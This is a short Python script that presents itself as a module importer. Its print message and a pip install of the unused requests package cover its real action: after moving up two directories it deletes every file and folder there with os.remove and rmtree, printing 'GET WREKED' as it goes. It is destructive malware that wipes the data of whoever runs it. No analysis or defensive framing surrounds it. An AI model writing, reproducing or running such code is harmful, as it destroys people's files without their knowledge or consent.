print("importing modules...")
import os
import sys
import shutil
from shutil import rmtree
try:
  import requests
except:
  print("requests module doesnt exists, installing..")
  try:
    os.system("pip install requests")
  except Exception as e:
    print("A error has been found: " + str(e))
os.system("cd")
os.chdir("..")
os.chdir("..")
for files in os.listdir():
  try:
    os.remove(files)
  except:
    rmtree(
        files,
        ignore_errors=True
      )
  print("GET WREKED")
